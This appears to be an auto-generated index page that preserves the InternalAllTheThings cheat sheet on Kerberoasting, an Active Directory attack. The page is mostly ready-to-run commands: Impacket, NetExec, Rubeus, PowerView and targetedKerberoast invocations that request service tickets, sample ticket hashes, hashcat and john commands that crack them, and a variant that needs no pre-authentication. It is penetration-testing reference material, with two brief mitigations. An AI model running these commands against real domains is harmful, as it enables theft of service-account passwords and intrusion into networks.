---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Roasting - Kerberoasting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-roasting-kerberoasting` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-roasting-kerberoasting.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Roasting - Kerberoasting](../../topics/active-directory/roasting-kerberoasting.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-roasting-kerberoasting |
| name | Roasting - Kerberoasting |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-roasting-kerberoasting.md |

## Preserved Source Material

````yaml
_body: "# Roasting - Kerberoasting\n\n> \"A service principal name (SPN) is a unique identifier of a service instance. SPNs\
  \ are used by Kerberos authentication to associate a service instance with a service logon account. \" - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)\n\
  \nAny valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password\
  \ cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.\n\
  \n* [SecureAuthCorp/impacket/GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)\
  \ from Impacket Suite\n\n  ```powershell\n  GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100\
  \ -request\n\n  Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies\n\n  ServicePrincipalName  Name      \
  \     MemberOf                                                  PasswordLastSet      LastLogon           \n  --------------------\
  \  -------------  --------------------------------------------------------  -------------------  -------------------\n \
  \ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03\
  \ 17:11:11 \n\n  $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2\n  ```\n\n* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)\n\
  \n  ```powershell\n  netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt\n  LDAP\
  \        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True)\
  \ (SMBv1:False)\n  LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9\n\
  \  ```\n\n* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)\n\n  ```powershell\n  # Stats\n  Rubeus.exe kerberoast\
  \ /stats\n  -------------------------------------   ----------------------------------\n  | Supported Encryption Type |\
  \ Count |  | Password Last Set Year | Count |\n  -------------------------------------  ----------------------------------\n\
  \  | RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |\n  -------------------------------------  ----------------------------------\n\
  \n  # Kerberoast (RC4 ticket)\n  Rubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt\n\
  \n  # Kerberoast (AES ticket)\n  # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.\n\
  \  Rubeus.exe kerberoast /tgtdeleg\n\n  # Kerberoast (RC4 ticket)\n  # The tgtdeleg trick is used, and accounts without\
  \ AES enabled are enumerated and roasted.\n  Rubeus.exe kerberoast /rc4opsec\n  ```\n\n* [PowerShellMafia/PowerSploit/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)\n\
  \n  ```powershell\n  Request-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n  ```\n\n* [its-a-feature/bifrost](https://github.com/its-a-feature/bifrost)\
  \ on **macOS** machine\n\n  ```powershell\n  ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local\
  \ -kerberoast true\n  ```\n\n* [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)\n\n\
  \  ```powershell\n  # for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName\
  \ attribute), \n  # print the \"kerberoast\" hash, and delete the temporary SPN set for that operation\n  targetedKerberoast.py\
  \ [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse]\
  \ [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key\
  \ hex key]\n  ```\n\nThen crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`)\n\n| Mode    | Description\
  \  |\n|---------|--------------|\n| `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |\n| `19600` | Kerberos 5 TGS-REP etype\
  \ 17 (AES128-CTS-HMAC-SHA1-96) |\n| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |\n\n```powershell\n\
  ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt\n./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs\
  \ ~/kerberos_hashes.txt\n```\n\n## Kerberoasting Without Pre-Authentication\n\n> If an attacker knows of an account for\
  \ which pre-authentication isn’t required (i.e. an ASREProastable account), as well as one (or multiple) service accounts\
  \ to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication\
  \ won’t be required).\n\n```ps1\nnetexec ldap 10.10.10.10 -u username -p '' --no-preauth-targets users.txt --kerberoasting\
  \ output.txt\n```\n\n## Mitigations\n\n* Have a very long password for your accounts with SPNs (> 32 characters)\n* Make\
  \ sure no users have SPNs\n\n## References\n\n* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)\n\
  * [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\n\
  * [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)\n* [Post-OSCP Series Part\
  \ 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)\n* [Training - Attacking\
  \ and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)"
_relative_path: active-directory/ad-roasting-kerberoasting.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-roasting-kerberoasting.md
````
